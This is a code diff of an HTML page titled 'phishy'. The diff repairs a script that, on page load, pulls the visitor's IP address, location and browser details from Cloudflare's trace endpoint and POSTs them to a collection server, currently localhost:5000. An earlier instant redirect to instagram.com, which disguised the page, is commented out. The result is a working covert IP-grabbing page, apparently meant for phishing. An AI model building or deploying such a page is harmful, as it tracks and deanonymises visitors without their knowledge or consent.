@@ -1,33 +1,34 @@
 <!DOCTYPE html>
-<meta
-  name="viewport"
-  content="width=device-width, initial-scale=1"
-  charset="UTF-8"
-/>
-<meta http-equiv="refresh" content="0; URL=https://www.instagram.com" />
+<meta name="viewport" content="width=device-width, initial-scale=1" charset="UTF-8" />
+<!-- <meta http-equiv="refresh" content="0; URL=https://www.instagram.com" /> -->
 <html lang="en">
   <head>
-    <title>NoTimeForDuty</title>
+    <title>phishy</title>
   </head>
   <body>
     <script>
-      window.post = (url, data) => {
-        return fetch(url, {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify(data),
-        })
-      }
+      ;(async () => {
+        window.post = (url, data) => {
+          return fetch(url, {
+            method: 'POST',
+            body: JSON.stringify(data)
+          }).catch((e) => console.log(e))
+        }
 
-      const response = await fetch('https://www.cloudflare.com/cdn-cgi/trace')
-      const userdata = await response.trim()
-                                     .split('\n')
-                                     .reduce((obj, pair) => {
-                                       pair = pair.split('=')
-                                       return (obj[pair[0]] = pair[1]), obj
-                                     }, {})
+        const response = await fetch('https://www.cloudflare.com/cdn-cgi/trace')
+        const response_text = await response.text()
+        const userdata = response_text
+          .trim()
+          .split('\n')
+          .reduce((obj, pair) => {
+            pair = pair.split('=')
+            return (obj[pair[0]] = pair[1]), obj
+          }, {})
 
-      post('localhost:5000', userdata)
+        console.log(userdata)
+
+        await post('http://localhost:5000', userdata)
+      })()
     </script>
   </body>
 </html>
